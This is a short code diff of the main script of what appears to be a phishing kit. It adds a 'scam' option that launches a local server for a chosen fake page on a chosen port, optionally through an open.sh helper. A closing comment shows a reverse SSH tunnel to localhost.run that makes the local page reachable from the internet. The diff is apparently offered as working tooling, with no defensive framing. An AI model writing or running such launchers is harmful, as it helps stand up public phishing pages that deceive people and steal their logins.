@@ -12,15 +12,29 @@ from scripts import props
 
 def main(scam, password, info):
     if (scam != "None"):
-        print(f"Scam!! {scam}")
+        subprocess.call(['python3', './scripts/server.py', '--scam', scam])
+
     elif (password):
-        print("En construcción")
+        print("In construction")
+
     elif (info):
-        props.info()
+        print(props.INFO)
+
     else:
         option = props.banner()
-        if(option != None and option != 'Help'):
-            subprocess.call(['python3', './scripts/server.py', '--scam', option])
+        port = props.port()
+        subdomain = props.localhost_run()
+
+        if (subdomain != None):
+            subprocess.call(['bash', './scripts/open.sh', option, port, subdomain])
+        
+        else:
+            subprocess.call(['python3', './scripts/server.py', '-s', option, '-p', port])
+
 
 if __name__ == "__main__":
-    main()
+    main()  
+
+
+#  konsole --noclose -e python3 ./scripts/server.py -s option -p port 
+#| konsole --noclose -e ssh -R 80:localhost:8080 test.localhost.run 
